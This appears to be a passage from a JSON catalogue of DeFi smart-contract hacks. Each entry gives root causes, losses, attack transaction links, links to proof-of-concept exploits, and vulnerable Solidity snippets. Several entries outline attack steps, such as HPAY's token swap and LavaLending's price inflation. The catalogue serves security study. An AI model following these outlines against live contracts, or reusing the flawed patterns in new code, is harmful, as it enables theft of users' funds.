        "vulnerable_code_snippet": "basicTransfer(from, mineAdd, amount.mul(1).div(100));\n\n_basicTransfer(from, nodeAdd, amount.mul(1).div(100));\n\nuint256 _burnAmount = 0;\n\nif (_tOwned[address(0xdEaD)] < _tTotal - minSwap) {\n    _burnAmount = amount.mul(2).div(100);\n    if (_burnAmount > _tTotal - minSwap - _tOwned[address(0xdEaD)]) {\n        _burnAmount = _tTotal - minSwap - _tOwned[address(0xdEaD)];\n    }\n}\n_basicTransfer(from, address(0xdEaD), _burnAmount);\n\namount = amount.mul(97).div(100) - _burnAmount;"

    },
    {
        "type": "Business Logic Flaw",
        "date": "20240401",
        "title": "OpenLeverage",
        "root_cause": "The attacker executed a two-step exploit. First, they created a margin trade with a small borrow and collateral, then liquidated it using a vulnerability in the `liquidate` function, which incorrectly included margin-borrowed amounts. They used the `repayBorrowEndByOpenLev` function to liquidate the position with minimal repayment. In the second step, they withdrew tokens using the `payoffTrade` function without repaying the borrowed amount, exploiting the zero borrow balance from the first transaction. The attack required two transactions due to a block time check.",
        "attack_tx": [
            {
                "transaction": 1,
                "link": "https://phalcon.blocksec.com/explorer/tx/bsc/0xf78a85eb32a193e3ed2e708803b57ea8ea22a7f25792851e3de2d7945e6d02d5"
            },
            {
                "transaction": 2,
                "link": "https://phalcon.blocksec.com/explorer/tx/bsc/0x210071108f3e5cd24f49ef4b8bcdc11804984b0c0334e18a9a2cdb4cd5186067"
            }
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/OpenLeverage2_exp.sol",
        "analysis": [
            {
                "link": "https://x.com/0xNickLFranklin/status/1774727546950795505",
                "text": "Vulnerable code snippet:"
            },
            {
                "link": "https://twitter.com/0xNickLFranklin/status/1774727539975672136",
                "text": "Analysis:"
            }
        ],
        "vulnerable_code_snippet": "uint insuranceAmount = OPBorrowingLib.shareToAmount(insuranceShare, borrowVars.borrowToken);\nuint diffRepayAmount = liquidateVars.repayAmount + liquidateVars.liquidationFees - liquidateVars.insuranceAmount;\nuint insuranceDecrease;\nif (insuranceAmount >= diffRepayAmount) {\n    OPBorrowingLib.repay(borrowVars.borrowPool, borrower, liquidateVars.repayAmount);\n    insuranceDecrease = OPBorrowingLib.amountToShare(diffRepayAmount, borrowVars.borrowToken);\n} else {\n    liquidateVars.repayAmount = liquidateVars.buyAmount + insuranceAmount - liquidateVars.insuranceAmount;\n    borrowVars.borrowPool.repayBorrowEndByOpenLev(borrower, liquidateVars.repayAmount);\n    liquidateVars.outstandingAmount = diffRepayAmount - insuranceAmount;\n    insuranceDecrease = insuranceShare;\n}\ndecreaseInsuranceShare(insurances[marketId], !collateralIndex, borrowVars.borrowToken, ..."
    },
    {
        "type": "Flashloans, Price Manipulation, claimTokens",
        "date": "20221214",
        "lost": "$76k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Nmbplatform_exp.sol",
        "title": "Nmbplatform",
        "root_cause": "Staking reward is based on spot price. The price feed of NIMB and GNIMB (the reward token) will be needed when calculating the staking reward. However, the price of NIMB is calculated based on the manipulated NIMB - NBU_WBNB pair.",
        "attack_tx": [
            "https://bscscan.com/tx/0x7d2d8d2cda2d81529e0e0af90c4bfb39b6e74fa363c60b031d719dd9d153b012",
            "https://bscscan.com/tx/0x42f56d3e86fb47e1edffa59222b33b73e7407d4b5bb05e23b83cb1771790f6c1"
        ],
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1602881707958407168",
            "https://twitter.com/BlockSecTeam/status/1602881707958407168"
        ],
        "vulnerable_code_snippet": "function getReward() public override nonReentrant whenNotPaused {\n    uint256 reward = earned(msg.sender);\n    if (reward > 0) {\n        for (uint256 i = 0; i < stakeNonces;\n    path[0] = tokenSrc;\n    path[1] = tokenDest;\n    return swapRouter.getAmountsOut(tokenAmount, path)[1];\n}"
    },
    {
        "type": "Access Control",
        "date": "20221017",
        "title": "Uerii",
        "root_cause": "Incorrect access control",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221017-uerii-token---access-control",
        "analysis": null,
        "vulnerable_code_snippet": "function mint() public returns (bool) { //vulnerable point\n        _mint( msg.sender, 100000000000000000 );\n        return true;\n    }"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240314",
        "title": "MO",
        "root_cause": "The Root Cause is in `borrow` function, it transfer MO tokens from pair to BURN address. After several `borrow` call, pair contains a few MO tokens.So hacker could drain pair with small amount of MO. Also in `borrow` function, MO token price is calculated using ratio of MO and USDT in pair. After several borrowing, MO price got much higher, he could borrow all USDT with small amount of MO tokens.",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/optimism/0x4ec3061724ca9f0b8d400866dd83b92647ad8c943a1c0ae9ae6c9bd1ef789417",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/MO_exp.sol",
        "analysis": "https://twitter.com/0xNickLFranklin/status/1768184024483430523",
        "lost": "413k USDT",
        "vulnerable_code_snippet": "function borrow(uint256 amount, uint256 duration) public {\n    if (borrowRates[duration] == 0) revert InvalidDuration();\n    if (amount < borrowMinAmount) revert InvalidAmount();\n\n    if (IToken(borrowToken).whitelist(msg.sender) == false) {\n        IToken(borrowToken).setWhitelist(msg.sender, true);\n    }\n\n    IApproveProxy(approveProxy).claim(borrowToken, msg.sender, address(this), amount);\n\n    uint256 total = (amount * price() * (BASE - borrowOverCollateral)) / BASE / 1e4;\n    IERC20(supplyToken).safeTransfer(msg.sender, total);\n\n    IUniswapV2Pair(pair).setRouter(address(this));\n    IUniswapV2Pair(pair).claim(borrowToken, BURN, (amount * burnRate) / BASE);\n    IUniswapV2Pair(pair).claim(borrowToken, address(this), (amount * (BASE - burnRate)) / BASE);\n    IUniswapV2Pair(pair).sync();\n\n    IUniswapV2Pair(pair).setRouter(router);\n\n    address referrer = IRelationship(relationship).referrers(msg.sender);\n    if (IPoolv2(poolv2).getOrder(referrer).running == true) {\n        uint256 referralReward = (amount * inviteRewardRate) / BASE;\n    }\n}"
    },
    {
        "type": "Insufficient validation",
        "date": "20220902",
        "title": "Bad Guys by RPF",
        "root_cause": "Insufficient validation. Missing check for `chosenAmount` in the WhiteListMint function which allowed the attacker to pass the number of NFTs he/she wanted to mint.",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220902-bad-guys-by-rpf---business-logic-flaw--missing-check-for-number-of-nft-to-mint",
        "analysis": "Missing check for \"chosenAmount\" in the WhiteListMint function which allowed the attacker to pass the number of NFTs he/she wanted to mint.",
        "vulnerable_code": "https://etherscan.io/address/0xb84cbaf116eb90fd445dd5aeadfab3e807d2cbac?utm_source=icy.tools#code#L1190",
        "lost": "400 NFTs",
        "vulnerable_code_snippet": "function WhiteListMint(bytes32[] calldata _merkleProof, uint256 chosenAmount) public {\n    require(_numberMinted(msg.sender) < 1, \"Already Claimed\");\n    require(isPaused == false, \"turn on minting\");\n    require(chosenAmount > 0, \"Number Of Tokens Can Not Be Less Than Or Equal To 0\");\n    require(totalSupply() + chosenAmount <= maxsupply - reserve, \"all tokens have been minted\");\n    bytes32 leaf = keccak256(abi.encodePacked(msg.sender));\n    require(MerkleProof.verify(_merkleProof, rootHash, leaf), \"Invalid Proof\");\n    _safeMint(msg.sender, chosenAmount); // vulnerable point\n}"
    },
    {
        "type": "Flashloans",
        "date": "20230606",
        "lost": "$26k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/UN_exp.sol",
        "title": "UN",
        "root_cause": "The vulnerable provided a gateway for the attacker to manipulate the token's value",
        "attack_tx": "https://bscscan.com/tx/0xff5515268d53df41d407036f547b206e288b226989da496fda367bfeb31c5b8b",
        "analysis": "https://metatrust.io/blogs/post/unraveling-the-un-attack-a-flash-loan-exploits-flaw-in-token-contract",
        "vulnerable_code_snippet": "} else if (from == swapPair) {\n    uint256 every = amount.div(100);\n    super._transfer(from, address(stake), every * 3);\n    stake.sendReward(every * 3);\n    super._transfer(from, address(this), every);\n    super._transfer(from, market, every * 3);\n    super._transfer(from, to, amount - every * 7);\n} else if (to == swapPair) {"
    },
    {
        "type": "Price Manipulation",
        "date": "20231018",
        "title": "MicDao",
        "root_cause": "The MicDao exploit occurred due to a vulnerability in the private `_transfer()` function. This function burned MicDao tokens whenever triggered, allowing the attacker to artificially reduce the total supply and inflate the token price.",
        "attack_tx": "https://bscscan.com/tx/0x24a2fbb27d433d91372525954f0d7d1af7509547b9ada29cc6c078e732c6d075",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/MicDao_exp.sol",
        "analysis": [
            "https://twitter.com/CertiKAlert/status/1714677875427684544",
            "https://twitter.com/ChainAegis/status/1714837519488205276"
        ],
        "Lost": "$13K",
        "vulnerable_code_snippet": "function _transfer(address sender, address recipient, uint256 amount) internal override {\n    if (pairList[recipient] && !isDelivers[sender]) {\n        uint256 toBurn = amount.mul(45).div(100);\n        super._transfer(sender, address(1), toBurn);\n        amount = amount.sub(toBurn);\n    }\n    super._transfer(sender, recipient, amount);\n}"
    },
    {
        "type": "Flashloans",
        "date": "20231008",
        "title": "pSeudoEth",
        "root_cause": "It is a flash loan exploit on pSeudoEth, where an attacker took ~$2.3k by causing an imbalance in the pETH/WETH pair and calling `skim()` to gain 1.43 WETH.",
        "attack_tx": "https://etherscan.io/tx/0x4ab68b21799828a57ea99c1288036889b39bf85785240576e697ebff524b3930",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/pSeudoEth_exp.sol",
        "analysis": [
            "https://etherscan.io/address/0x2033b54b6789a963a02bfcbd40a46816770f1161",
            "https://twitter.com/CertiKAlert/status/1710979615164944729"
        ]
    },
    {
        "type": "MaliciosProposal",
        "date": "20220508",
        "lost": "$3 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220508-fortress-loans---malicious-proposal--price-oracle-manipulation",
        "title": "Fortress Loans",
        "root_cause": "Insufficient validation in submit() in chain contract. L142 was commented out. There is no verification to ensure the function call is triggered properly. Anyone can call submit function to manipulate price oracle.",
        "vulnerable_code_snippet": "function submit(\n    uint32 _dataTimestamp,\n    bytes32 _root,\n    bytes32[] memory _keys,\n    uint256[] memory _values,\n    uint8[] memory _v,\n    bytes32[] memory _r,\n    bytes32[] memory _s\n  ) public {\n... \nrequire(i >= requiredSignatures, \"not enough signatures\");\n    // we turn on power once we have proper DPoS\n    // require(power * 100 / staked >= 66, \"not enough power was gathered\");",
        "analysis": "L142 was commented out. There is no verification to ensure the function call is triggered properly. Anyone can call submit function to manipulate price oracle.\n\n```solidity\nfunction submit(\n    uint32 _dataTimestamp,\n    bytes32 _root,\n    bytes32[] memory _keys,\n    uint256[] memory _values,\n    uint8[] memory _v,\n    bytes32[] memory _r,\n    bytes32[] memory _s\n  ) public {\n... \nrequire(i >= requiredSignatures, \"not enough signatures\");\n    // we turn on power once we have proper DPoS\n    // require(power * 100 / staked >= 66, \"not enough power was gathered\");\n```"
    },
    {
        "type": "Access Control, ERC20",
        "date": "20221018",
        "lost": "115 BNB",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221018-hpay---access-control",
        "title": "HPAY",
        "fixed": "fixed",
        "root_cause": "Incorrect access control. Due _addre is controllable. Attacker can call setToken() to set fake token created by self.\n1.setToken to faketoken\n2.Deposit faketoken\n3.setToken to HPAY\n3.withdraw.  over",
        "vulnerable_code_snippet": "function setToken(address _addr) public { //vulnerable point\n        configuration.stakingToken = ERC20(_addr);\n        configuration.rewardsToken = ERC20(_addr);\n    }",
        "analysis": "Due _addre is controllable. Attacker can call setToken() to set fake token created by self.\n\n1.setToken to faketoken\n2.Deposit faketoken\n3.setToken to HPAY\n3.withdraw.  over\n\n```solidity\nfunction setToken(address _addr) public { //vulnerable point\n        configuration.stakingToken = ERC20(_addr);\n        configuration.rewardsToken = ERC20(_addr);\n    }\n"
    },
    {
        "type": "DAO, Insufficient validation",
        "date": "20220303",
        "title": "TreasureDAO",
        "root_cause": "Insufficient validation",
        "lost": "$470 k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220303-treasuredao---zero-fee",
        "attack_tx": null,
        "analysis": "Since _quantity can be zero, so attacker can buy NFT for free",
        "vulnerable_code": "[https://arbiscan.io/address/0x812cda2181ed7c45a35a691e0c85e231d218e273#code#F17#L226](https://arbiscan.io/address/0x812cda2181ed7c45a35a691e0c85e231d218e273#code#F17#L226)"
    },
    {
        "type": "Miscalculation, Storage collision, Upgradable",
        "date": "20230224",
        "title": "EFVault",
        "root_cause": "Bad contract upgrades cause storage collision. The upgrade introduced new storage items, and modifications were made to the existing storage structure. The original storage order of variables was not maintained. The data storage structure of the old version was not taken into account, so when reading the `assetDecimal` variable in the new implementation contract, the data read is still the proxy contract slot, which is the value of the `maxDeposit` variable of the old version. Due to the Storage Collision, The value of maxDeposit was set to 5000000000000, which is much higher than the value it is expected to set. This results in the return value of the assetPerShare function being much larger and thus the value of assets becomes larger.",
        "attack_tx": [
            "0xab86672eb5335264c4c4b75262630ae1fb8dcf2a68aaafe4bb9fc3232b886712",
            "0x31565843d565ecab7ab65965d180e45a99d4718fa192c2f2221410f65ea03743"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/EFVault_exp.sol",
        "analysis": "https://twitter.com/BeosinAlert/status/1630884733671579653",
        "vulnerable_code": "https://etherscan.io/address/0x80cb73074a6965f60df59bf8fa3ce398ffa2702c#code#F1#L145",
        "vulnerable_code_snippet": "function assetsPerShare() internal view returns (uint256) {\n    return (IController(controller).totalAssets(false) * assetDecimal * 1e18) / totalSupply();\n}\n\nfunction redeem(uint256 shares, address receiver) public virtual nonReentrant unPaused onlyAllowed returns (uint256 assets) {\n    require(shares > 0, \"ZERO_SHARES\");\n    require(shares <= balanceOf(msg.sender), \"EXCEED_TOTAL_BALANCE\");\n    assets = (shares * assetsPerShare()) / 1e24; // Miscalculation of assets\n    require(assets <= maxWithdraw, \"EXCEED_ONE_TIME_MAX_WITHDRAW\");\n    // Withdraw asset\n    _withdraw(assets, shares, receiver);\n}"
    },
    {
        "type": "Business Logic Flaw, Incorrect logic",
        "date": "20240328",
        "title": "LavaLending",
        "root_cause": [
            "1. Create an account with LPT tokens as collateral.",
            "2. Generate one-sided trading fees for the LPT.",
            "3. Use a different account to borrow and unwind the LPT tokens.",
            "4. The wrapper mistakenly includes the fees as assets, causing a significant increase in the LPT token price due to low actual liquidity.",
            "5. This boost in token price increases the first account's borrowing power, allowing it to borrow all the assets in the lending market."
        ],
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/arbitrum/0xcb1a2f5eeb1a767ea5ccbc3665351fadc1af135d12a38c504f8f6eb997e9e603",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/LavaLending_exp.sol",
        "analysis": [
            "Donating assets via trading fees was identified as an attack vector. The wrapper attempts to prevent this by limiting trading fees to a maximum APR value, but this check was not triggered because only token0 fees exceeded the limit while token1 fees did not.",
            "Vulnerable code snippet:\n[WrapperOracle | Address 0x7746872c6892bcfb4254390283719f2bd2d4da76 | Arbitrum One](https://arbiscan.io/address/0x7746872c6892bcfb4254390283719f2bd2d4da76#code)",
            "Analysis:\n",
            "[Nick L. Franklin on Twitter / X](https://twitter.com/0xNickLFranklin/status/1774727539975672136)",
            "[BlockSec Phalcon on Twitter / X](https://twitter.com/Phalcon_xyz/status/1773546399713345965)",
            "[Lava Post-Mortem: March 28, 2024 - HackMD](https://hackmd.io/@LavaSecurity/03282024)"
        ],
        "Lost": "340K",
          "vulnerable_code_snippet": "// SPDX-License-Identifier: AGPL-3.0-or-later\n\n/// GUniOracle.sol\n\n// based heavily on GUniLPOracle.sol from MakerDAO\n\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU Affero General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// (at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU Affero General Public License for more details.\n//\n// You should have received a copy of the GNU Affero General Public License\n// along with this program.  If not, see <https://www.gnu.org/licenses/>.\n\n///////////////////////////////////////////////////////\n//                                                   //\n//    Methodology for Calculating LP Token Price     //\n//                                                   //\n///////////////////////////////////////////////////////\n\n// We derive the sqrtPriceX96 via Chainlink Oracles to prevent price manipulation in the pool:\n//\n// p0 = price of token0 in USD (18 decimal precision)\n// p1 = price of token1 in USD (18 decimal precision)\n// UNITS_0 = decimals of token0\n// UNITS_1 = decimals of token1\n//\n// token1/token0 = (p0 / 10^UNITS_0) / (p1 / 10^UNITS_1)               [price ratio, Uniswap format]\n//               = (p0 * 10^UNITS_1) / (p1 * 10^UNITS_0)\n//\n// sqrtPriceX96 = sqrt(token1/token0) * 2^96                           [From Uniswap's definition]\n//              = sqrt((p0 * 10^UNITS_1) / (p1 * 10^UNITS_0)) * 2^96\n//              = sqrt((p0 * 10^UNITS_1) / (p1 * 10^UNITS_0)) * 2^48 * 2^48\n//              = sqrt((p0 * 10^UNITS_1 * 2^96) / (p1 * 10^UNITS_0)) * 2^48\n//\n// Once we have the sqrtPriceX96 we can use that to compute the fair reserves for each token.\n// This part may be slightly subjective depending on the implementation,\n// but we expect token to provide something like getUnderlyingBalancesAtPrice(uint160 sqrtPriceX96)\n// which will forward our oracle derived `sqrtPriceX96`\n// to Uniswap's LiquidityAmounts.getAmountsForLiquidity(...)\n// This function will return the fair reserves for each token.\n// Vendor-specific logic is then used to tack any uninvested fees on top of those amounts.\n//\n// Once we have the fair reserves and the prices we can compute the token price by:\n//\n// Token Price = TVL / Token Supply\n//             = (r0 * p0 + r1 * p1) / totalSupply\n\nimport \"../interfaces/IAggregator.sol\";\n\npragma solidity > 0.8.0;\n\ninterface IExtendedAggregator is IAggregator {\n    enum TokenType {\n        Invalid,\n        Simple,\n        Complex\n    }\n\n    enum PlatformId {\n        Invalid,\n        Simple,\n        Uniswap,\n        Balancer,\n        GUni\n    }\n\n    /**\n     * @dev Returns the LP shares token\n     * @return address of the LP shares token\n     */\n    function getToken() external view returns (address);\n\n    /**\n     * @dev Returns the number of tokens that composes the LP shares\n     * @return address[] memory of token addresses\n     */\n    function getSubTokens() external view returns (address[] memory);\n\n    /**\n     * @dev Returns the latest price\n     * @return int256 price\n     */\n    function latestAnswer() external view returns (int256);\n\n    /**\n     * @dev Returns the decimals of latestAnswer()\n     * @return uint8\n     */\n    function decimals() external pure returns (uint8);\n\n    /**\n     * @dev Returns the platform id to categorize the price aggregator\n     * @return uint256 1 = Uniswap, 2 = Balancer, 3 = G-UNI\n     */\n    function getPlatformId() external pure returns (PlatformId);\n\n    /**\n     * @dev Returns token type for categorization\n     * @return uint256 1 = Simple (Native or plain ERC20s), 2 = Complex (LP Tokens, Staked tokens)\n     */\n    function getTokenType() external pure returns (TokenType);\n}\n\ninterface IWrapper {\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getAssetsBasedOnPrice(uint160 price) external view returns (uint256 amount0, uint256 amount1);\n    function totalSupply() external view returns (uint256);\n}\n\ncontract WrapperOracle is IExtendedAggregator {\n    // solhint-disable private-vars-leading-underscore, var-name-mixedcase\n    uint256 private immutable UNIT_0;\n    uint256 private immutable UNIT_1;\n    uint256 private immutable TO_WAD_0;\n    uint256 private immutable TO_WAD_1;\n    uint256 private immutable TO_WAD_ORACLE_0;\n    uint256 private immutable TO_WAD_ORACLE_1;\n\n    address public immutable pool;\n    address public immutable priceFeed0;\n    address public immutable priceFeed1;\n\n    constructor(address _pool, address _feed0, address _feed1) {\n        uint256 dec0 = uint256(IExtendedAggregator(IWrapper(_pool).token0()).decimals());\n        require(dec0 <= 18, \"token0-dec-gt-18\");\n        UNIT_0 = 10 ** dec0;\n        TO_WAD_0 = 10 ** (18 - dec0);\n        uint256 dec1 = uint256(IExtendedAggregator(IWrapper(_pool).token1()).decimals());\n        require(dec1 <= 18, \"token1-dec-gt-18\");\n        UNIT_1 = 10 ** dec1;\n        TO_WAD_1 = 10 ** (18 - dec1);\n        uint256 decOracle0 = uint256(IExtendedAggregator(_feed0).decimals());\n        require(decOracle0 <= 18, \"oracle0-dec-gt-18\");\n        TO_WAD_ORACLE_0 = 10 ** (18 - decOracle0);\n        uint256 decOracle1 = uint256(IExtendedAggregator(_feed1).decimals());\n        require(decOracle1 <= 18, \"oracle1-dec-gt-18\");\n        TO_WAD_ORACLE_1 = 10 ** (18 - decOracle1);\n        pool = _pool;\n        priceFeed0 = _feed0;\n        priceFeed1 = _feed1;\n    }\n\n    function latestRoundData()\n        public\n        view\n        override\n        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)\n    {\n        return (0, latestAnswer(), 0, 0, 0);\n    }\n\n    function latestAnswer() public view override returns (int256) {\n        // All Oracle prices are priced with 18 decimals against USD\n        uint256 p0 = _getWADPrice(true); // Query token0 price from oracle (WAD)\n        uint256 p1 = _getWADPrice(false); // Query token1 price from oracle (WAD)\n        uint160 sqrtPriceX96 = _toUint160(_sqrt(_mul(_mul(p0, UNIT_1), (1 << 96)) / (_mul(p1, UNIT_0))) << 48);\n\n        // Get balances of the tokens in the pool\n        (uint256 r0, uint256 r1) = IWrapper(pool).getAssetsBasedOnPrice(sqrtPriceX96);\n        require(r0 > 0 || r1 > 0, \"invalid-balances\");\n        uint256 totalSupply = IWrapper(pool).totalSupply();\n        // Protect against precision errors with dust-levels of collateral\n        require(totalSupply >= 1e9, \"total-supply-too-small\");\n\n        // Add the total value of each token together and divide by totalSupply to get unit price\n        uint256 preq = _add(_mul(p0, _mul(r0, TO_WAD_0)), _mul(p1, _mul(r1, TO_WAD_1))) / totalSupply;\n\n        return int256(preq);\n    }\n\n    function getToken() external view override returns (address) {\n        return pool;\n    }\n\n    function getSubTokens() external view override returns (address[] memory) {\n        address[] memory arr = new address[](2);\n        arr[0] = IWrapper(pool).token0();\n        arr[1] = IWrapper(pool).token1();\n        return arr;\n    }\n\n    function getPlatformId() external pure override returns (IExtendedAggregator.PlatformId) {\n        return IExtendedAggregator.PlatformId.GUni;\n    }\n\n    function getTokenType() external pure override returns (IExtendedAggregator.TokenType) {\n        return IExtendedAggregator.TokenType.Complex;\n    }\n\n    function decimals() external pure override returns (uint8) {\n        return 18;\n    }\n\n    function _getWADPrice(bool isToken0) internal view returns (uint256) {\n        int256 price = IExtendedAggregator(isToken0 ? priceFeed0 : priceFeed1).latestAnswer();\n        require(price > 0, \"negative-price\");\n        return _mul(uint256(price), isToken0 ? TO_WAD_ORACLE_0 : TO_WAD_ORACLE_1);\n    }\n\n    function _add(uint256 _x, uint256 _y) internal pure returns (uint256 z) {\n        require((z = _x + _y) >= _x, \"add-overflow\");\n    }\n\n    function _sub(uint256 _x, uint256 _y) internal pure returns (uint256 z) {\n        require((z = _x - _y) <= _x, \"sub-underflow\");\n    }\n\n    function _mul(uint256 _x, uint256 _y) internal pure returns (uint256 z) {\n        require(_y == 0 || (z = _x * _y) / _y == _x, \"mul-overflow\");\n    }\n\n    function _toUint160(uint256 x) internal pure returns (uint160 z) {\n        require((z = uint160(x)) == x, \"uint160-overflow\");\n    }\n\n    // solhint-disable-next-line max-line-length\n    // FROM https://github.com/abdk-consulting/abdk-libraries-solidity/blob/16d7e1dd8628dfa2f88d5dadab731df7ada70bdd/ABDKMath64x64.sol#L687\n    // solhint-disable-next-line code-complexity\n    function _sqrt(uint256 _x) private pure returns (uint128) {\n        if (_x == 0) {\n            return 0;\n        } else {\n            uint256 xx = _x;\n            uint256 r = 1;\n            if (xx >= 0x100000000000000000000000000000000) {\n                xx >>= 128;\n                r <<= 64;\n            }\n            if (xx >= 0x10000000000000000) {\n                xx >>= 64;\n                r <<= 32;\n            }\n            if (xx >= 0x100000000) {\n                xx >>= 32;\n                r <<= 16;\n            }\n            if (xx >= 0x10000) {\n                xx >>= 16;\n                r <<= 8;\n            }\n            if (xx >= 0x100) {\n                xx >>= 8;\n                r <<= 4;\n            }\n            if (xx >= 0x10) {\n                xx >>= 4;\n                r <<= 2;\n            }\n            if (xx >= 0x8) r <<= 1;\n            r = (r + _x / r) >> 1;\n            r = (r + _x / r) >> 1;\n            r = (r + _x / r) >> 1;\n            r = (r + _x / r) >> 1;\n            r = (r + _x / r) >> 1;\n            r = (r + _x / r) >> 1;\n            r = (r + _x / r) >> 1; // Seven iterations should be enough\n            uint256 r1 = _x / r;\n            return uint128(r < r1 ? r : r1);\n        }\n    }\n} ... // SPDX-License-Identifier: MIT\npragma solidity >=0.8.0;\n\ninterface IAggregator {\n    function decimals() external view returns (uint8);\n    function latestAnswer() external view returns (int256 answer);\n    function latestRoundData()\n        external\n        view\n        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);\n}"
    },
    {
        "type": "Access Control, Yield",
        "date": "20221011",
        "title": "Templedao",
        "root_cause": "insufficient access control to the migrateStake function.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221011-templedao---insufficient-access-control",
        "attack_tx": null,
        "analysis": "The `migrateStake` function did not have sufficient access control checks. This allowed an attacker to call the function and migrate funds from the old staking contract to the new contract without proper authorization.",
        "vulnerable_code": "https://etherscan.io/address/0xd2869042e12a3506100af1d192b5b04d65137941#code#F1#L241",
        "lost": "$2.3 M",
        "vulnerable_code_snippet": "/**\n      * @notice For migrations to a new staking contract:\n      *         1. User/DApp checks if the user has a balance in the `oldStakingContract`\n      *         2. If yes, user calls this function `newStakingContract.migrateStake(oldStakingContract, balance)`\n      *         3. Staking balances are migrated to the new contract, user will start to earn rewards in the new contract.\n      *         4. Any claimable rewards in the old contract are sent directly to the user's wallet.\n      * @param oldStaking The old staking contract funds are being migrated from.\n      * @param amount The amount to migrate - generally this would be the staker's balance\n      */\n    function migrateStake(address oldStaking, uint256 amount) external {. //vulnerable point\n        StaxLPStaking(oldStaking).migrateWithdraw(msg.sender, amount);\n        _applyStake(msg.sender, amount);\n    }"
    },
    {
        "type": "Business Logic Flaw, Flashloans, Insufficient validation , Misconfiguration",
        "date": "20230325",
        "lost": "$24k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/DBW_exp.sol",
        "title": "DBW",
        "root_cause": "The root cause is that the dividend awards are based on the percentage of LP currently owned by the user, and does not take into account multiple dividends after the transfer of LP.",
        "attack_tx": "https://bscscan.com/tx/0x3b472f87431a52082bae7d8524b4e0af3cf930a105646259e1249f2218525607",
        "analysis": [
            "https://twitter.com/BeosinAlert/status/1639655134232969216",
            "https://twitter.com/AnciliaInc/status/1639289686937210880"
        ],
        "vulnerable_code_snippet": "function getStaticIncome() public {\n        if(!hasRole(VIP_ROLE, msg.sender)&&!_is_static_dynamic){\n            _staticIncome_(msg.sender); //vulnerable point\n        }\n    }\n...\nfunction pledge_lp (uint256 count) public{\n        require(!Address.isContract(msg.sender),\"the address is contract\");\n        require(count > 0,\"count > 0\");\n        uint256 _spend = IERC20(_lp).allowance(msg.sender,address(this));\n        require(_spend >= count,\"lp must be authorized first\");\n        uint256 _lpBalance = IERC20(_lp).balanceOf(msg.sender);\n        require(_lpBalance >= count,\"lp Insufficient balance\");\n        bool _isTransfer = IERC20(_lp).transferFrom(msg.sender,address(this),count);\n        require(_isTransfer,\"lp transfer err\");\n        _balances_lp[msg.sender] += count;\n        _user_convertLPToDBW[msg.sender] = convertLPToDBW(_balances_lp[msg.sender]);\n        ff_handling_fee_user[msg.sender] = _handling_fee;\n        \n        if(!isHaveLPuser(msg.sender)){\n            lpUserCount++;\n            lpUsers.push(msg.sender);\n        }\n    }\n...\nfunction redemption_lp (uint256 count) public{\n        require(!Address.isContract(msg.sender),\"the address is contract\");\n        require(count > 0,\"count > 0\");\n        require(_balances_lp[msg.sender] >= count,\"_balances_lp[msg.sender] >= count\");\n        \n        bool _isTransfer = IERC20(_lp).transfer(msg.sender, count);\n        require(_isTransfer,\"not lp Transfer\");\n        _balances_lp[msg.sender] -= count;\n        _user_convertLPToDBW[msg.sender] = convertLPToDBW(_balances_lp[msg.sender]);\n\n        uint256 ff_count = getFFCount();\n        if(ff_count > 0){\n            _transfer(address(this), msg.sender, ff_count);\n            //_user_dbw_lp[msg.sender]+=ff_count;\n            ff_handling_fee_user[msg.sender] = _handling_fee;\n        }\n    }"
    },
    {
        "type": "Access Control, Incorrect logic",
        "date": "20230617",
        "title": "Pawnfi",
        "root_cause": "A failure of the protocol to verify whether the NFT had actually been transferred when users used a specified NFT as collateral for borrowing.",
        "attack_tx": "https://etherscan.io/tx/0x8d3036371ccf27579d3cb3d4b4b71e99334cae8d7e8088247517ec640c7a59a5",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/Pawnfi_exp.sol",
        "analysis": "https://blog.solidityscan.com/pawnfi-hack-analysis-38ac9160cbb4",
        "lost": "$820K",
